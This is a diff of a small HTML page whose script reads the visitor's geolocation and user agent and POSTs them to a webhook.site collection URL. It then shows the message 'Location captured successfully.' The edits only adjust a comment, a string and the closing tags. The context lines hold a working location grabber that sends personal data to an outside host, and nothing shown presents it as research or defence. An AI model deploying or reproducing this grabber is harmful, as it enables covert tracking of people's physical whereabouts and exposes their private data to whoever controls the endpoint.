@@ -20,7 +20,7 @@ navigator.geolocation.getCurrentPosition(
       userAgent: navigator.userAgent
     };
 
-    // SEND DATA TO YOU
+    // SEND DATA TO YOUR END (Webhook)
     fetch("https://webhook.site/30f14c22-c02f-4d1c-ad3c-6e72844a7dc6", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -28,7 +28,7 @@ navigator.geolocation.getCurrentPosition(
     });
 
     document.getElementById("status").innerText =
-      `Location captured successfully.`;
+      "Location captured successfully.";
   },
   (err) => {
     document.getElementById("status").innerText =
@@ -42,6 +42,8 @@ navigator.geolocation.getCurrentPosition(
 );
 </script>
 
+</body>
+</html>
 
-</bod
+
 
